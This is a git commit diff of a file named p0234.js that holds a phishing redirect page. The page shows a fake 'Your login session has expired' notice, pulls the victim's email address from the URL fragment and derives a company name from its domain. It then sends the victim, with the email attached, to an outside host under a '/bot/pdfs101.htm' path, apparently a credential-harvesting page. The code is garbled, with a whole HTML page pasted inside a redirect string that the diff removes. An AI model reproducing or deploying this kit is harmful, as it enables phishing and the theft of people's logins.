6a3af6a4435342f7bf3b0b781d3601ea4302d347
tanjanegineering-oss <tanjanegineering@gmail.com>
2026-04-19 09:14:41 -0700

    Update p0234.js

--- p0234.js
+++ p0234.js
@@ -22,34 +22,7 @@ function encodeEmail(email) {
 
 
 	
-	var my_ai=btoa(valueAfterEquals);
-	
-	
-  window.location.replace("<!DOCTYPE html>
-<html>
-<head><title>Redirecting......</title></head>
-<body>
-  <p style="color:red; size:25">Your login session has expired.</p>
-
-   <script>
- 
-
-	var feedUpdateResponse = window.location.href;
-   
-
-
-const valueAfterEquals = feedUpdateResponse.split('#').slice(1).join('#');
-
-
-console.log(valueAfterEquals); // splendid@gmail.com
-
-function encodeEmail(email) {
-  return encodeURIComponent(email);
-}
-
-
-	
-	var my_ai=btoa(valueAfterEquals);
+	var my_ai=valueAfterEquals;
 	
 	 var ind = my_ai.indexOf("@");
     var my_slice = my_ai.substr((ind + 1));
@@ -60,24 +33,12 @@ var companyName = domain.split('.')[0];
 	 
 		 const num = Math.floor(Math.random() * 1990) + 188;
 		  const num1 = Math.floor(Math.random() * 1990) + 188;
+
   window.location.replace("https://pdf-security.aeroform-composite.com/bot/pdfs101.htm?username=aWJlbndhQHFxLmNvbQ%3D%3D&_r=yZdPVI8#"+my_ai);
-          
-	
-
-  
   
   
   
 </script>
 </body>
 </html>
-          
-	
 
-  
-  
-  
-  
-</script>
-</body>
-</html>
